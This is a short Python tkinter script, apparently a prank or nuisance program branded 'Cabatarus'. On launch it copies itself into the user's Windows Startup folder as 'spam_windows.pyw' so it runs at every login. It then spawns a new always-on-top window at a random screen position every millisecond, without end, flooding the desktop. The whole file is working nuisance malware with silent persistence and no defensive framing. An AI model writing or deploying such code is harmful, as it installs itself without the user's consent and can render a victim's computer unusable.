import tkinter as tk
import random
import os
import shutil

root = tk.Tk()
root.withdraw()


def create_window():
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    window_width = 300
    window_height = 200

    x = random.randint(0, screen_width - window_width)
    y = random.randint(0, screen_height - window_height)

    window = tk.Toplevel(root)  # Use Toplevel for additional windows
    window.title("Cabatarus")
    window.geometry("{}x{}+{}+{}".format(window_width, window_height, x, y))
    window.attributes("-topmost", True)

    window.pack_propagate(False)

    font_size = min(window_width, window_height) // 15
    label_font = ("Helvetica", font_size)

    label = tk.Label(window, text="Cabatarus Is The Best!!!", font=label_font)
    label.pack(expand=True, fill='both')

    window.protocol("WM_DELETE_WINDOW", lambda: window.destroy())
    
    root.after(1, create_window)


def add_to_startup(file_path):
    home_dir = os.path.expanduser("~")

    # Determine the startup folder path
    startup_folder = os.path.join(home_dir, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs",
                                  "Startup")

    shutil.copyfile(file_path, os.path.join(startup_folder, "spam_windows.pyw"))
    print("Script successfully added to startup folder.")


add_to_startup(__file__)

create_window()

root.mainloop()
